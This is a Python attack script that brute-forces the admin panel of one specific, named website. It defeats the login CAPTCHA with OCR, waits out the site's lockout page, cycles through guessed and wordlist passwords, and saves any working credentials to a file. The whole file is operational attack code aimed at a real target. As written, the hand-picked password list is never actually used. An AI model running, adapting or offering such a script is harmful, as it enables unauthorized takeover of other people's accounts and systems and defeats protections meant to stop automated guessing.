#!/usr/bin/env python3
"""bc_brute3.py - 075588866576 admin brute v3
In-process ddddocr (no subprocess - reliable OCR), timeout != success
"""
import urllib.request, urllib.parse, re, http.cookiejar, io, sys, time, socket
from PIL import Image
import ddddocr

socket.setdefaulttimeout(10)  # DNS/connect hang guard

HOST = "http://075588866576.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
OUT = "/tmp/bc3_hits.txt"
_OCR = ddddocr.DdddOcr(show_ad=False)

def ocr_enhance(img_bytes):
    try:
        t = _OCR.classification(img_bytes)
        if t and len(t) >= 4:
            return t.strip()
        img = Image.open(io.BytesIO(img_bytes)).convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = img.point(lambda x: 0 if x < 140 else 255)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        t = _OCR.classification(buf.getvalue())
        return t.strip() if t and len(t) >= 4 else None
    except Exception:
        return None

def fetch(op, url, data=None, timeout=12, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return -1, url, str(ex).encode()

def try_login(op, pw, max_tries=10):
    for t in range(max_tries):
        try:
            code, final, body = fetch(op, HOST + "/admin/index.asp")
            code, final, cap = fetch(op, HOST + "/admin/vCode.asp",
                                     headers={"Referer": HOST + "/admin/index.asp"})
            if code != 200 or len(cap) < 100:
                time.sleep(2); continue
            cap_text = ocr_enhance(cap)
            if not cap_text:
                time.sleep(1); continue
            data = urllib.parse.urlencode({"admin": "admin", "password": pw, "VerifyCode": cap_text})
            code, final, resp = fetch(op, HOST + "/admin/adminpass.asp", data=data,
                                      headers={"Referer": HOST + "/admin/index.asp",
                                               "X-Requested-With": "XMLHttpRequest"})
            if code == -1:
                time.sleep(2); continue
            rt = resp.decode("gbk", "ignore")
            if "stopinfo" in final or "stopinfo" in rt:
                time.sleep(40); continue
            if "验证码" in rt:
                continue
            if "密码" in rt and "错误" in rt:
                return False, "pw-wrong"
            if code == 302:
                return True, "302->" + final
            if "欢迎" in rt or "成功" in rt:
                return True, rt[:100]
        except Exception:
            time.sleep(2)
    return False, "ocr-fail"

def main():
    pws = []
    base = ["123456", "admin123", "admin888", "123456789", "666888", "888888", "000000",
            "tl123456", "tenglong", "tenglong123", "agent", "agent123", "kf123456",
            "lehu123", "bet123", "qwe123", "abc123", "123123", "111111", "222222",
            "admin", "admin666", "a123456", "123456a", "admin2020", "admin2021",
            "admin2022", "admin2023", "admin2024", "admin2025", "tl888888", "tenglong888",
            "075588866576", "0755", "88886666", "12345678", "1234567890", "password",
            "qwerty", "zxcvbn", "1q2w3e4r", "qazwsx", "147258", "159357", "258369",
            "5201314", "woaini", "1314520", "a123456789", "123456789a", "admin!@#",
            "1942", "1234", "5678", "1001", "521", "888", "666", "777", "999",
            "194200", "194266", "tenglong8888", "tl8888", "kf888", "agent888"]
    try:
        with open("/opt/msray/pw_mega.txt") as f:
            mega = [l.strip() for l in f if l.strip()]
        for pw in mega:
            if re.match(r'^(tl|tenglong|agent|kf|lehu|admin|bet)', pw, re.I) or re.match(r'^\d{4,10}$', pw):
                if pw not in pws:
                    pws.append(pw)
    except Exception:
        pass
    seen = set()
    pws = [p for p in pws if not (p in seen or seen.add(p))]
    print("passwords: %d" % len(pws), flush=True)

    for i, pw in enumerate(pws):
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        ok, info = try_login(op, pw)
        if ok:
            print("!!! HIT admin/%s -> %s" % (pw, info), flush=True)
            with open(OUT, "a") as f:
                f.write("HIT admin/%s %s\n" % (pw, info))
            return
        if i % 3 == 0:
            print("  %d/%d admin/%s %s" % (i, len(pws), pw, info), flush=True)
        time.sleep(0.3)
    print("[done] no hit", flush=True)

if __name__ == "__main__":
    main()
